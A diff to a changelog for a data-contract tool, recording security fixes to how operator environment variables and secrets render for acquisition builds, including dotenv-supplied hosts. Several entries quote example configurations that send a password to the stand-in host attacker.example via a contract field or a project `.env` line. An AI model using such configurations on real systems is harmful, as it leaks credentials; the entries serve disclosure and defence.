@@ -74,8 +74,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   the key is the destination. Each variable, whatever it is called, in `properties.source`, in
   `properties.sink` and in the `binding.location` of every expose now renders only when every
   endpoint of those blocks is this machine (loopback, a local socket), a host written
-  as one whole `{{ env.* }}` (`host: "{{ env.PGHOST }}"`: the operator chose the address), or a
-  host the operator paired with it (`NAME@host` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the
+  as one whole `{{ env.* }}` (`host: "{{ env.PGHOST }}"`: the operator chose the address, unless a
+  project dotenv file supplied its value), or a host the operator paired with it (`NAME@host` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the
   bare `NAME` for any host). The endpoints are the ones the secret policy reads for a `secretRef`
   in the same block (keyword connection strings, query-string hosts, SSH tunnels, host lists,
   Snowflake's `account`), so a blank or unreadable endpoint refuses, and so does a field named
@@ -237,13 +237,25 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   URL's authority is refused unless the operator pairs it with the host it makes, `NAME@host` in
   `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST` (a loopback host needs no entry). A variable that is the
   whole host (`host: "{{ env.PGHOST }}"`, `https://{{ env.CATALOG_HOST }}/catalog`) needs no
-  pairing: the operator chose the address. The refusal names the variable and the field, never the
-  rendered value.
+  pairing: the operator chose the address, as long as the value is the operator's (see the next
+  entries). The refusal names the variable and the field, never the rendered value.
 - **No operator variable reaches a host the contract picks, whatever it is called (acquisition
   builds).** `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered the
   password and sent it to attacker.example, and a variable's name cannot tell `DB_PW`, `PGPASS` or
   `DATABASE_URL` from a harmless one. Each variable now renders only for the endpoints of its
   block that the operator paired it with (see Changed).
+- **A host variable that only a project's dotenv file sets is no longer the operator's choice
+  (acquisition builds).** `fluid apply` loads the project's `.env`, `.env.<env>` and `.env.local`
+  before it renders anything, and those files may set any name the credential policy does not list.
+  With `ZZZ=attacker.example` in `.env`, and a contract that has `host: "{{ env.ZZZ }}"` beside
+  `password: "{{ env.DB_PW }}"`, the host counted as one whole variable the operator chose, so
+  DB_PW was sent to attacker.example and the command exited 0. A whole-variable host, an SSH
+  tunnel host or an address field the policy cannot read is now the operator's choice only while
+  the value is the operator's own: from the shell, the CI environment or `FLUID_SECRETS_FILE`. A
+  value that a project dotenv file supplied is judged like a host the contract wrote: the variable
+  needs `NAME@<host it renders to>` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, and so does every
+  variable sent there; a host that is this machine needs no entry. The refusal names the variable
+  and says that a project dotenv file supplied it, never the value.
 - **The SQL gates refuse DuckDB's logging functions and the table functions that run text.**
   `compile_free_form_sql` (the MCP output port's `query_sql`),
   `validate_sql_expression_allowlist` and `guard_against_injection_markers` now refuse a call to
@@ -355,6 +367,13 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   (`bootstrap_servers`, `brokers`, `db_host`) takes the bare variable name. Contracts written by
   `fluid import meltano`, `airbyte` and `singer` put a literal host beside `{{ env.PASSWORD }}`,
   so they need those entries.
+- **Acquisition builds: a host variable that only the project's `.env` sets needs the operator's
+  pairing.** A contract with `host: "{{ env.DB_HOST }}"` whose `DB_HOST` comes from the project's
+  `.env`, `.env.<env>` or `.env.local` now stops, unless the host is this machine, until the
+  operator exports `DB_HOST` themselves (in the shell, in CI or in `FLUID_SECRETS_FILE`: the address
+  is then theirs) or lists `DB_HOST@<host>` and `NAME@<host>` for each variable the block sends
+  there in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`. A variable the operator already exports is
+  unchanged, whatever the project's file says.
 - **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
   fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
   gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
